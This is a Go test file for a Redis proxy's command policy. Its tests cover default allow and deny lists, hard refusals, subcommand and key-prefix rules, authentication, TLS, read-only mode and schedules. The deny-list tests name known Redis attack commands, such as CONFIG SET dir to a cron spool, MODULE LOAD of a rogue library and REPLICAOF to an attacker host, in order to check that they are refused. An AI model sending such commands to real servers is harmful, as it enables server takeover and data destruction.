package redis

import (
	"bytes"
	"fmt"
	"net/netip"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	wire "github.com/rom/xproxy/internal/respwire"
)

func mustCompile(t *testing.T, c *config.RedisListener) *policy {
	t.Helper()
	p, err := compile(c)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// cmd builds a parsed command the way the reader would.
func cmd(t *testing.T, parts ...string) *wire.Command {
	t.Helper()
	var b bytes.Buffer
	fmt.Fprintf(&b, "*%d\r\n", len(parts))
	for _, p := range parts {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(p), p)
	}
	c, err := wire.NewReader(&b, 0, 0, 0).Next()
	if err != nil {
		t.Fatalf("%v: %v", parts, err)
	}
	return c
}

func sess(user string) *Session {
	return &Session{IP: netip.MustParseAddr("10.0.0.5"), User: user, Secure: true,
		Authed: true, At: time.Date(2026, 3, 4, 12, 0, 0, 0, time.UTC)}
}

func boolp(v bool) *bool { return &v }

// The default allow list is what an application does to a cache, and the absences
// are the value. On this protocol the distance between an administrative command
// and a shell is one command.
func TestTheDefaultListIsWhatAnApplicationDoes(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	s := sess("app")
	for _, parts := range [][]string{
		{"GET", "session:abc"}, {"SET", "session:abc", "v"}, {"DEL", "session:abc"},
		{"HGETALL", "user:1"}, {"LPUSH", "q", "job"}, {"ZADD", "z", "1", "m"},
		{"EXPIRE", "k", "60"}, {"MULTI"}, {"EXEC"}, {"PING"},
		{"XADD", "s", "*", "f", "v"}, {"SUBSCRIBE", "chan"},
	} {
		if d := p.Command(s, cmd(t, parts...)); !d.Allow {
			t.Errorf("%v: %+v", parts, d)
		}
	}
	// And the ones that are off until named, including the two that write a file
	// and the one that stops the single thread serving everybody.
	for _, parts := range [][]string{
		{"CONFIG", "SET", "dir", "/var/spool/cron"},
		{"CONFIG", "GET", "dir"},
		{"MODULE", "LOAD", "/tmp/evil.so"},
		{"EVAL", "return redis.call('flushall')", "0"},
		{"REPLICAOF", "attacker.example", "6379"},
		{"SLAVEOF", "attacker.example", "6379"},
		{"DEBUG", "SEGFAULT"},
		{"FLUSHALL"}, {"SHUTDOWN", "NOSAVE"}, {"SAVE"}, {"BGSAVE"},
		{"KEYS", "*"}, {"RANDOMKEY"}, {"MONITOR"},
		{"MIGRATE", "h", "6379", "k", "0", "100"},
		{"SCRIPT", "LOAD", "x"}, {"FUNCTION", "LOAD", "x"},
		{"ACL", "SETUSER", "me", "on", "allkeys"},
		{"CLIENT", "KILL", "ID", "1"},
		{"SLOWLOG", "GET"}, {"LATENCY", "HISTORY", "x"},
		{"PSUBSCRIBE", "*"},
	} {
		if d := p.Command(s, cmd(t, parts...)); d.Allow {
			t.Errorf("%v was allowed by default", parts)
		}
	}
}

// A refusal of one of the ways out of the database is not shadowed, and KEYS is in
// that set on different grounds: it is O(n) on the single thread that serves every
// client, so a monitor-mode listener that forwarded one would cause the outage it
// was installed to prevent and record that it had noticed.
func TestRefusingAWayOutIsNeverShadowed(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	s := sess("app")
	for _, name := range wire.DangerousCommands() {
		d := p.Command(s, cmd(t, name, "x"))
		if d.Allow {
			t.Errorf("%s was allowed", name)
		}
		if !d.Hard {
			t.Errorf("%s: a refusal monitor mode would shadow", name)
		}
	}
	// A command merely off the allow list is a soft refusal: it is probably an
	// application nobody has listed yet, and finding those is what monitor mode
	// is for.
	if d := p.Command(s, cmd(t, "GETRANGE_NOPE", "k", "0", "1")); d.Allow || d.Hard {
		t.Fatalf("%+v", d)
	}
	// An operator who names one has said so and is not overruled.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands: []string{"GET", "flushall"}})
	if d := p.Command(s, cmd(t, "FLUSHALL")); !d.Allow {
		t.Fatalf("named explicitly: %+v", d)
	}
}

// CONFIG GET is a read and CONFIG SET writes a file wherever the server can write,
// so a policy that could only say CONFIG would have to refuse both or neither.
func TestASubcommandCanBeAllowedWithoutItsSiblings(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands:    []string{"GET", "CONFIG", "CLIENT"},
		AllowSubcommands: []string{"CONFIG GET", "config resetstat"},
	})
	s := sess("ops")
	for _, tc := range []struct {
		parts []string
		ok    bool
	}{
		{[]string{"CONFIG", "GET", "maxmemory"}, true},
		{[]string{"CONFIG", "RESETSTAT"}, true},
		{[]string{"CONFIG", "SET", "dir", "/tmp"}, false},
		{[]string{"CONFIG", "REWRITE"}, false},
		// CLIENT is allowed and no CLIENT subcommand is listed, so all of its
		// subcommands are allowed: a set that does not mention a container
		// command is not a policy about it.
		{[]string{"CLIENT", "SETNAME", "x"}, true},
		{[]string{"CLIENT", "KILL", "ID", "1"}, true},
	} {
		d := p.Command(s, cmd(t, tc.parts...))
		if d.Allow != tc.ok {
			t.Errorf("%v: allow=%v (%+v)", tc.parts, d.Allow, d)
		}
	}
	// The deny list wins over the allow list, on the subcommand too.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands: []string{"CONFIG"}, DenySubcommands: []string{"CONFIG SET"}})
	if d := p.Command(s, cmd(t, "CONFIG", "SET", "dir", "/tmp")); d.Allow {
		t.Fatalf("deny_subcommands lost: %+v", d)
	}
	if d := p.Command(s, cmd(t, "CONFIG", "GET", "dir")); !d.Allow {
		t.Fatalf("CONFIG GET was refused too: %+v", d)
	}
}

// A command before the connection has authenticated is refused, hard.
//
// This is the setting that turns "reachable" back into "authorised" in front of a
// server whose requirepass is unset -- which is most of them -- so forwarding one
// and writing down that it was noticed means the command ran.
func TestACommandBeforeAuthenticationIsRefusedHard(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	s := sess("")
	s.Authed = false

	d := p.Command(s, cmd(t, "GET", "k"))
	if d.Allow || !d.Hard || d.Reason != "not_authenticated" {
		t.Fatalf("%+v", d)
	}
	// What a client may legitimately send first is named rather than guessed: the
	// alternative is a window an attacker fills with one command.
	for _, parts := range [][]string{
		{"AUTH", "hunter2"}, {"AUTH", "app", "hunter2"},
		{"HELLO", "3"}, {"HELLO", "3", "AUTH", "app", "hunter2"},
		{"PING"}, {"QUIT"}, {"RESET"}, {"COMMAND", "DOCS"},
	} {
		if d := p.Command(s, cmd(t, parts...)); !d.Allow {
			t.Errorf("%v before auth: %+v", parts, d)
		}
	}
	// Once the server has accepted a credential, ordinary commands go.
	s.Authed = true
	if d := p.Command(s, cmd(t, "GET", "k")); !d.Allow {
		t.Fatalf("%+v", d)
	}
	// And with the requirement off, the first command goes -- which is what the
	// setting says and why the validator warns about it.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		RequireAuth: boolp(false)})
	s.Authed = false
	if d := p.Command(s, cmd(t, "GET", "k")); !d.Allow {
		t.Fatalf("require_auth false: %+v", d)
	}
}

// The key prefix policy, which is the closest this protocol has to the
// database-and-table boundary the SQL kinds leave to GRANT.
func TestTheKeyPrefixPolicy(t *testing.T) {
	// EVAL is not on the default allow list, so the policy under test names it.
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands:    append(wire.DefaultCommands(), "EVAL"),
		AllowKeyPrefixes: []string{"app:", "session:"},
		DenyKeyPrefixes:  []string{"app:secret:"},
	})
	s := sess("app")
	for _, tc := range []struct {
		parts []string
		ok    bool
		why   string
	}{
		{[]string{"GET", "app:1"}, true, "an allowed prefix"},
		{[]string{"GET", "other:1"}, false, "a prefix that is not allowed"},
		{[]string{"GET", "app:secret:1"}, false, "a denied prefix inside an allowed one"},
		// Every key is checked, not the first: a command that touched one allowed
		// key and one forbidden one would otherwise pass.
		{[]string{"MGET", "app:1", "app:2"}, true, "several allowed keys"},
		{[]string{"MGET", "app:1", "other:2"}, false, "one forbidden key among allowed ones"},
		{[]string{"RENAME", "app:1", "other:2"}, false, "a rename out of the allowed space"},
		// Interleaved keys and values: a reader that took every argument would
		// check the values against the prefix list and refuse everything.
		{[]string{"MSET", "app:1", "v1", "app:2", "v2"}, true, "interleaved keys"},
		{[]string{"MSET", "app:1", "v1", "other:2", "v2"}, false, "one forbidden key interleaved"},
		// The key count is an argument on EVAL, and it decides which arguments
		// are keys rather than which are the script or its data.
		{[]string{"EVAL", "return 1", "1", "app:1", "other"}, true, "a script's declared key"},
		{[]string{"EVAL", "return 1", "1", "other:1", "app:x"}, false, "a script's forbidden key"},
		// A keyless command has no key to refuse.
		{[]string{"PING"}, true, "a command with no keys"},
	} {
		d := p.Command(s, cmd(t, tc.parts...))
		if d.Allow != tc.ok {
			t.Errorf("%s %v: allow=%v (%+v)", tc.why, tc.parts, d.Allow, d)
		}
	}
	// With no prefix policy at all, no key is checked and the `unknown` case
	// never arises.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	if d := p.Command(s, cmd(t, "GET", "anything")); !d.Allow {
		t.Fatalf("%+v", d)
	}
}

// A command whose key positions depend on an option is refused while a prefix
// policy is in force, rather than checked against the wrong argument.
//
// This is the assertion the prefix policy's honesty rests on. Checking a STORE
// option's value, a Lua script's text or a timeout against a prefix list is a
// policy that passes exactly what it was meant to stop, and it would pass
// silently.
func TestACommandWhoseKeysCannotBeLocatedIsRefusedUnderAPrefixPolicy(t *testing.T) {
	all := append(wire.DefaultCommands(), "SORT", "XREAD", "MIGRATE", "ZUNIONSTORE",
		"GEORADIUS")
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands: all, AllowKeyPrefixes: []string{"app:"}})
	s := sess("app")
	for _, parts := range [][]string{
		{"SORT", "app:list", "STORE", "other:dest"},
		{"XREAD", "COUNT", "2", "STREAMS", "app:s", "0"},
		{"MIGRATE", "h", "6379", "", "0", "100", "KEYS", "app:1"},
		{"ZUNIONSTORE", "app:dest", "2", "app:a", "other:b"},
		{"GEORADIUS", "app:g", "0", "0", "1", "km", "STORE", "other:d"},
	} {
		d := p.Command(s, cmd(t, parts...))
		if d.Allow {
			t.Errorf("%v was allowed under a prefix policy", parts)
		}
		if d.Reason != "key_position_unknown" {
			t.Errorf("%v: refused as %q, want key_position_unknown", parts, d.Reason)
		}
		if !d.Hard {
			t.Errorf("%v: a refusal monitor mode would shadow", parts)
		}
	}
	// Without a prefix policy the same commands go, which is the point of
	// refusing them rather than removing them: the operator chooses.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowCommands: all})
	for _, parts := range [][]string{
		{"SORT", "app:list", "STORE", "other:dest"},
		{"XREAD", "COUNT", "2", "STREAMS", "app:s", "0"},
	} {
		if d := p.Command(s, cmd(t, parts...)); !d.Allow {
			t.Errorf("%v with no prefix policy: %+v", parts, d)
		}
	}
}

// read_only, and the direction an unknown command has to fall.
func TestReadOnly(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		ReadOnly: true, AllowCommands: append(wire.DefaultCommands(), "EVAL", "EVAL_RO")})
	s := sess("reporting")
	for _, tc := range []struct {
		parts []string
		ok    bool
	}{
		{[]string{"GET", "k"}, true},
		{[]string{"MGET", "a", "b"}, true},
		{[]string{"HGETALL", "h"}, true},
		{[]string{"ZRANGE", "z", "0", "-1"}, true},
		{[]string{"TTL", "k"}, true},
		{[]string{"SET", "k", "v"}, false},
		{[]string{"DEL", "k"}, false},
		{[]string{"EXPIRE", "k", "1"}, false},
		{[]string{"LPUSH", "l", "v"}, false},
		{[]string{"PUBLISH", "c", "m"}, false},
		// A script can do anything the connection can, so allowing one on a
		// read-only listener would make the setting decorative. The server's own
		// _RO promise is honoured.
		{[]string{"EVAL", "return 1", "0"}, false},
		{[]string{"EVAL_RO", "return 1", "0"}, true},
	} {
		d := p.Command(s, cmd(t, tc.parts...))
		if d.Allow != tc.ok {
			t.Errorf("%v: allow=%v (%+v)", tc.parts, d.Allow, d)
		}
	}
}

// The inline form is off by default: no client library sends it and most
// exploitation scripts do, so refusing it costs an operator nothing.
func TestTheInlineFormIsOffByDefault(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	s := sess("app")
	inline, err := wire.NewReader(bytes.NewReader([]byte("PING\r\n")), 0, 0, 0).Next()
	if err != nil {
		t.Fatal(err)
	}
	d := p.Command(s, inline)
	if d.Allow || d.Reason != "inline_not_allowed" {
		t.Fatalf("%+v", d)
	}
	// Not hard: it is a form rather than an escalation, and an operator running a
	// trial wants to find out whether anything of theirs uses it.
	if d.Hard {
		t.Fatal("a refusal of the inline form should be observable in monitor mode")
	}
	// The same command as a multibulk goes, which is what makes the setting a
	// statement about the form and not about PING.
	if d = p.Command(s, cmd(t, "PING")); !d.Allow {
		t.Fatalf("%+v", d)
	}
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowInline: true})
	if d = p.Command(s, inline); !d.Allow {
		t.Fatalf("named: %+v", d)
	}
}

// The identity lists, and the one-argument AUTH form that names no user.
func TestTheAuthIdentityLists(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowUsers: []string{"app", "reporting"}})
	s := sess("")
	for _, tc := range []struct {
		user string
		ok   bool
	}{
		{"app", true},
		{"APP", true}, // Redis ACL names are case-sensitive; the policy is not,
		{"reporting", true},
		{"admin", false},
		// The one-argument AUTH form names nobody, and Redis authenticates it as
		// `default` -- so that is the name the policy judges, rather than the
		// command silently bypassing a user list.
		{"", false},
	} {
		d := p.Auth(s, tc.user)
		if d.Allow != tc.ok {
			t.Errorf("%q: allow=%v (%+v)", tc.user, d.Allow, d)
		}
	}
	// And with `default` named, the short form works.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowUsers: []string{"default"}})
	if d := p.Auth(s, ""); !d.Allow {
		t.Fatalf("%+v", d)
	}
}

// TLS is not negotiated on this protocol -- the port is either encrypted or it is
// not -- so the refusal is decided before a command is read, and it is hard: an
// AUTH on this connection puts the password on the wire as an ordinary command
// argument.
func TestTLSIsDecidedBeforeACommandIsRead(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	s := sess("app")
	s.Secure = false
	d := p.Connect(s)
	if d.Allow || !d.Hard || d.Reason != "tls_required" {
		t.Fatalf("%+v", d)
	}
	s.Secure = true
	if d = p.Connect(s); !d.Allow {
		t.Fatalf("%+v", d)
	}
	// The client list is decided here too, and before the identity: a network
	// that may not reach the cache is refused without the relay caring who it
	// claims to be.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		RequireTLS: boolp(false), AllowClients: []string{"10.0.0.0/24"},
		DenyClients: []string{"10.0.0.9/32"}})
	for _, tc := range []struct {
		ip string
		ok bool
	}{
		{"10.0.0.5", true},
		{"10.0.0.9", false},
		{"192.168.1.5", false},
	} {
		s := &Session{IP: netip.MustParseAddr(tc.ip), At: time.Now()}
		if d := p.Connect(s); d.Allow != tc.ok {
			t.Errorf("%s: allow=%v", tc.ip, d.Allow)
		}
	}
}

// A Redis database is not an access boundary, but it is how an estate separates one
// application's keys from another's -- and a relay can hold that line where the
// server will not.
func TestSelectIsBoundedWhenTheConfigurationSaysSo(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow",
		AllowDatabases: []int{0, 3}})
	s := sess("app")
	for _, tc := range []struct {
		db int
		ok bool
	}{{0, true}, {3, true}, {1, false}, {15, false}} {
		if d := p.SelectDB(s, tc.db); d.Allow != tc.ok {
			t.Errorf("SELECT %d: allow=%v", tc.db, d.Allow)
		}
	}
	// Empty allows any, because most estates use database 0 and nothing else and
	// a bound nobody asked for would refuse a client library's own SELECT 0.
	p = mustCompile(t, &config.RedisListener{Upstream: "u", DefaultAction: "allow"})
	for _, db := range []int{0, 1, 15} {
		if d := p.SelectDB(s, db); !d.Allow {
			t.Errorf("SELECT %d with no list: %+v", db, d)
		}
	}
}

// Rules select on the client and the authenticated user, and a schedule bounds
// when what a rule allows is allowed.
func TestRulesAndSchedules(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{
		Upstream: "u", DefaultAction: "allow",
		Rules: []config.RedisRule{
			{Name: "ops", Users: []string{"ops"},
				Schedule:         &config.ModbusSchedule{From: "02:00", To: "04:00"},
				AllowCommands:    append(wire.DefaultCommands(), "FLUSHDB", "CONFIG"),
				AllowSubcommands: []string{"CONFIG GET"}},
			{Name: "readers", Clients: []string{"10.0.9.0/24"}, ReadOnly: boolp(true)},
		},
	})
	night := time.Date(2026, 3, 4, 3, 0, 0, 0, time.UTC)
	noon := time.Date(2026, 3, 4, 12, 0, 0, 0, time.UTC)

	ops := sess("ops")
	ops.At = night
	if d := p.Command(ops, cmd(t, "FLUSHDB")); !d.Allow || d.Rule != "ops" {
		t.Fatalf("in the window: %+v", d)
	}
	ops.At = noon
	d := p.Command(ops, cmd(t, "FLUSHDB"))
	if d.Allow || d.Reason != "outside_schedule" {
		t.Fatalf("outside it: %+v", d)
	}
	// The rule widens its own traffic and narrows the subcommand at the same
	// time: CONFIG GET in the window, CONFIG SET never.
	ops.At = night
	if d = p.Command(ops, cmd(t, "CONFIG", "GET", "maxmemory")); !d.Allow {
		t.Fatalf("%+v", d)
	}
	if d = p.Command(ops, cmd(t, "CONFIG", "SET", "dir", "/tmp")); d.Allow {
		t.Fatalf("CONFIG SET was allowed: %+v", d)
	}
	// A rule selected on the client makes that traffic read-only without the
	// listener being.
	reader := &Session{IP: netip.MustParseAddr("10.0.9.7"), User: "app",
		Secure: true, Authed: true, At: noon}
	if d = p.Command(reader, cmd(t, "GET", "k")); !d.Allow || d.Rule != "readers" {
		t.Fatalf("%+v", d)
	}
	if d = p.Command(reader, cmd(t, "SET", "k", "v")); d.Allow || d.Reason != "read_only" {
		t.Fatalf("%+v", d)
	}
	// And the listener's own traffic is not read-only.
	if d = p.Command(sess("app"), cmd(t, "SET", "k", "v")); !d.Allow {
		t.Fatalf("%+v", d)
	}
}

// A configuration the relay cannot make sense of is refused at compile rather than
// at the first connection that trips over it.
func TestABadConfigurationIsRefusedAtCompile(t *testing.T) {
	for _, tc := range []struct {
		name string
		c    *config.RedisListener
	}{
		{"a subcommand that is not two words",
			&config.RedisListener{Upstream: "u", AllowSubcommands: []string{"CONFIG"}}},
		{"a subcommand with three words",
			&config.RedisListener{Upstream: "u", DenySubcommands: []string{"CONFIG SET DIR"}}},
		{"an unparseable client network",
			&config.RedisListener{Upstream: "u", AllowClients: []string{"10.0.0.1"}}},
		{"an unparseable deny network",
			&config.RedisListener{Upstream: "u", DenyClients: []string{"nope"}}},
		{"a default action that is neither",
			&config.RedisListener{Upstream: "u", DefaultAction: "maybe"}},
		{"a negative database number",
			&config.RedisListener{Upstream: "u", AllowDatabases: []int{-1}}},
		{"a rule action that is none of the three",
			&config.RedisListener{Upstream: "u", Rules: []config.RedisRule{{Action: "perhaps"}}}},
		{"a rule with an unparseable network",
			&config.RedisListener{Upstream: "u", Rules: []config.RedisRule{{Clients: []string{"x"}}}}},
		{"a rule with a bad subcommand",
			&config.RedisListener{Upstream: "u",
				Rules: []config.RedisRule{{AllowSubcommands: []string{"CONFIG"}}}}},
		{"a rule with a day that is not a day",
			&config.RedisListener{Upstream: "u", Rules: []config.RedisRule{
				{Schedule: &config.ModbusSchedule{Days: []string{"someday"}}}}}},
	} {
		if _, err := compile(tc.c); err == nil {
			t.Errorf("%s was accepted", tc.name)
		}
	}
	// An unnamed rule still has a name, so a log line and a counter can refer to
	// it.
	p := mustCompile(t, &config.RedisListener{Upstream: "u",
		Rules: []config.RedisRule{{Users: []string{"app"}}}})
	if d := p.Command(sess("app"), cmd(t, "GET", "k")); d.Rule != "rules[0]" {
		t.Fatalf("%+v", d)
	}
}

// The bounds a reader is given come from the policy, and a bulk bound above the
// message bound is not a bound.
func TestTheBoundsReachTheReader(t *testing.T) {
	p := mustCompile(t, &config.RedisListener{Upstream: "u",
		MaxMessageBytes: 4096, MaxBulkBytes: 1024, MaxElements: 16})
	if p.MaxMessage() != 4096 || p.MaxBulk() != 1024 || p.MaxElements() != 16 {
		t.Fatalf("%d %d %d", p.MaxMessage(), p.MaxBulk(), p.MaxElements())
	}
	// The defaults are the wire package's, so one place decides them.
	p = mustCompile(t, &config.RedisListener{Upstream: "u"})
	if p.MaxMessage() != wire.DefaultMaxMessage || p.MaxBulk() != wire.DefaultMaxBulk ||
		p.MaxElements() != wire.DefaultMaxElements {
		t.Fatalf("%d %d %d", p.MaxMessage(), p.MaxBulk(), p.MaxElements())
	}
}
